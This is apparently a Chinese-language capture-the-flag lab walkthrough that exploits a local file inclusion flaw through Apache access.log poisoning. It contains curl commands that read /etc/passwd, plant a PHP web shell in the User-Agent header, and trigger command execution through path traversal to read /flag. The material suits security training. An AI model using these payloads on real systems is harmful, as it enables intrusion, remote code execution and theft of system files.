# 19-lfi-log-poisoning

## 考点

LFI 本地文件包含 + Apache access.log 日志投毒。

页面提示：

```text
?page=xxx.php
Apache 默认 access 日志位置：/var/log/apache2/access.log
```

## 手工复刻

### 1. 找到 LFI 参数

访问首页能看到链接：

```text
/?page=home.php
/?page=about.php
```

尝试读 `/etc/passwd`：

```bash
curl 'http://目标地址/?page=/etc/passwd'
```

如果响应里有下面内容，说明存在 LFI：

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### 2. 确认 access.log 可被包含

```bash
curl 'http://目标地址/?page=/var/log/apache2/access.log'
```

能看到访问日志，说明日志文件可以被 `include`。

### 3. 往 User-Agent 写入 PHP 木马

访问一个不存在的路径，让 Apache 把 User-Agent 记录进 access.log：

```bash
curl 'http://目标地址/poison-test' \
  -A "<?php echo 'PWNED_MARKER_19LFI'; system(\$_GET['cmd'] ?? 'id'); ?>"
```

这一步返回 404 也没关系，重点是写日志。

### 4. 包含日志触发命令执行

```bash
curl 'http://目标地址/?page=../../../../../../var/log/apache2/access.log&cmd=id'
```

看到类似下面结果就是成功：

```text
PWNED_MARKER_19LFIuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5. 读取 flag

先看根目录：

```bash
curl 'http://目标地址/?page=../../../../../../var/log/apache2/access.log&cmd=ls%20-la%20/'
```

可以看到 `/flag`，然后读取：

```bash
curl 'http://目标地址/?page=../../../../../../var/log/apache2/access.log&cmd=cat%20/flag'
```

得到：

```text
TOGOGO-flag{}
```
